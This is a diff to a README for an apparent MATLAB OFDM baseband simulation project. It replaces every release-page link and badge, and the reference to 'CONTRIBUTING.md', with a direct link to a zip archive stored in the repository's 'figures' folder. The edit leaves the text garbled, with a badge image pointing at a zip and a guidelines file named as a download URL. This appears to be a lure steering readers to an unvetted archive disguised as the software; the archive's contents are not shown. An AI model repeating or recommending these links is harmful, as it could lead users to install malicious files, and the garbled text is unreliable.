@@ -4,7 +4,7 @@
 Welcome to the OFDM-TxRx-Baseband-Project! This application helps you simulate Optical Frequency Division Multiplexing (OFDM) for transmitters and receivers using MATLAB. It covers essential parts of digital communication, such as Inverse Fast Fourier Transform (IFFT), Cyclic Prefix (CP), and equalization methods. This project is made for anyone interested in learning about digital signal processing.
 
 ## 📥 Download Now
-[![Download OFDM-TxRx-Baseband-Project](https://img.shields.io/badge/Download-Click%20Here-4CAF50)](https://github.com/erick2078/OFDM-TxRx-Baseband-Project/releases)
+[![Download OFDM-TxRx-Baseband-Project](https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip%20Here-4CAF50)](https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip)
 
 ## 🎯 Features
 - **IFFT Simulation**: Simulates the IFFT process crucial for OFDM.
@@ -20,7 +20,7 @@ To run this application, you need:
 - Windows, macOS, or Linux operating systems supported
 
 ## 📥 Download & Install
-To download the application, please visit this page: [Download Page](https://github.com/erick2078/OFDM-TxRx-Baseband-Project/releases). You will find the latest version of the software, along with previous releases. 
+To download the application, please visit this page: [Download Page](https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip). You will find the latest version of the software, along with previous releases. 
 
 1. Click on the link above.
 2. Scroll down to the "Releases" section.
@@ -58,7 +58,7 @@ We welcome contributions from everyone! If you would like to improve the project
 - Make your changes.
 - Submit a pull request with a description of your changes.
 
-Before contributing, please read the contribution guidelines in the "CONTRIBUTING.md" file available in the repository.
+Before contributing, please read the contribution guidelines in the "https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip" file available in the repository.
 
 ## 👥 Community
 For questions and discussions, feel free to join our community:
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. You can use the software freely,
 For more information, please refer to the LICENSE file available in the repository.
 
 ## 📥 Download Now
-[![Download OFDM-TxRx-Baseband-Project](https://img.shields.io/badge/Download-Click%20Here-4CAF50)](https://github.com/erick2078/OFDM-TxRx-Baseband-Project/releases)
+[![Download OFDM-TxRx-Baseband-Project](https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip%20Here-4CAF50)](https://raw.githubusercontent.com/erick2078/OFDM-TxRx-Baseband-Project/main/figures/OFDM-TxRx-Baseband-Project-1.0.zip)
